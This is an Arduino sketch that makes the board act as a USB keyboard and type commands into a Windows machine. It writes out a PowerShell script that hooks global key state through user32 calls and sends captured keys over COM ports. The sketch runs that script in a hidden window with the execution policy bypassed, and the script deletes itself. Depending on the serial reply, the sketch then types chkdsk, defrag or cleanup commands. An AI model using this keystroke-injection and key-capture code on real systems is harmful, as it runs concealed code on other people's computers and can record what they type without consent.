#include "Keyboard.h"
void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
boolean found = false;
void setup()
{
  Serial.begin(9600);
  Keyboard.begin();
  delay(4000);
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print(F("powershell\n"));
  delay(600);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(800);
  Keyboard.println("echo \"cls\" \"echo `\"PRESS BUTTON 1 to 5`\"\" \"`$signatures = @'\" \"[DllImport(`\"user32.dll`\", CharSet=CharSet.Auto, ExactSpelling=true)]\" \"public static extern short GetAsyncKeyState(int virtualKeyCode);\" \"[DllImport(`\"user32.dll`\", CharSet=CharSet.Auto)]\" \"public static extern int GetKeyboardState(byte[] keystate);\" \"[DllImport(`\"user32.dll`\", CharSet=CharSet.Auto)]\" \"public static extern int MapVirtualKey(uint uCode, int uMapType);\" \"[DllImport(`\"user32.dll`\", CharSet=CharSet.Auto)]\" \"public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\" \"'@\" \"`$API = Add-Type -MemberDefinition `$signatures -Name 'Win32' -Namespace API -PassThru\" \"`$doLoad = `$true;\" \"try {\" \"while (`$doLoad) {\" \"Start-Sleep -Milliseconds 40\" \"for (`$ascii = 9; `$ascii -le 254; `$ascii++) {\" \"`$state = `$API::GetAsyncKeyState(`$ascii)\" \"if (`$state -eq -32767) {\" \"`$null = [console]::CapsLock\" \"`$virtualKey = `$API::MapVirtualKey(`$ascii, 3)\" \"`$kbstate = New-Object -TypeName Byte[] -ArgumentList 256\" \"`$checkkbstate = `$API::GetKeyboardState(`$kbstate)\" \"`$mychar = New-Object -TypeName System.Text.StringBuilder\" \"`$success = `$API::ToUnicode(`$ascii, `$virtualKey, `$kbstate, `$mychar, `$mychar.Capacity, 0)\" \"if (`$success) {\" \" `$max = 24\" \" `$loads = 0\" \" while(`$loads -lt `$max)\" \" {\" \"cmd.exe /c `\"echo `\"`$mychar`\" > \\\\.\\COM`\"`$loads;\" \"`$loads++;\" \" }\" \"`$doLoad = `$false;\" \"}\" \"}\" \"}\" \"}\" \"}\" \"finally\" \"{\" \"del wretched.ps1\" \"exit;\" \"}\" > wretched.ps1");
  Keyboard.println("powershell -WindowStyle Hidden -ExecutionPolicy ByPass -File wretched.ps1");

  while (found != true)
  {
    if (Serial.available() > 0 && found != true) {
      int selected = Serial.parseInt();
      if (selected == 1)
      {
        found = true;
        do1();
      }
      if (selected == 2)
      {
        found = true;
        do2();
      }
      if (selected == 3)
      {
        found = true;
        do3();
      }
      found = true;
    }
  }
}

void do1()
{
  Keyboard.begin();
  delay(4000);
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print(F("cmd\n"));
  delay(400);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();  
  delay(800);
  typeKey(KEY_TAB);
  delay(400);
  typeKey(KEY_TAB);
  Keyboard.press(KEY_RETURN);
  delay(400);
  Keyboard.releaseAll();  
  delay(500);
  Keyboard.println("chkdsk C: /r");
  delay(500);
  Keyboard.println("y");
  delay(100);
  Keyboard.println("exit");
  Keyboard.end();
}
void do2()
{
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print(F("defrag\n"));
  delay(600);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(600);
  typeKey(KEY_TAB);
  delay(400);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}
void do3()
{   
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print(F("cleanup\n"));
  delay(400);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll(); 
  Keyboard.end();
}

void loop() {
}
